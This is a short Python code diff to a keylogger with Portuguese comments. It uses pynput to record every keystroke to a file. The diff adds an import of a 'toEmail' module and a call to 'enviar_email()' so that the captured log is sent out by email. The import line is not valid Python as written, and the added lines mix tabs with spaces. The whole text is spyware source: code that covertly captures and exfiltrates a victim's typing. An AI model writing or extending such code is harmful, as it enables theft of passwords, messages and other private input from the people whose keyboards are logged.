@@ -1,4 +1,5 @@
 from pynput import keyboard
+import toEmail.pyw as toEmail
 
 # Mapeamento de teclas especiais para o texto correspondente
 TECLAS_ESPECIAIS = {
@@ -23,4 +24,5 @@ def on_press(key):
                 file.write(f"[{key}] ")
 
 with keyboard.Listener(on_press=on_press) as listener:
-    listener.join()
+	toEmail.enviar_email()
+	listener.join()
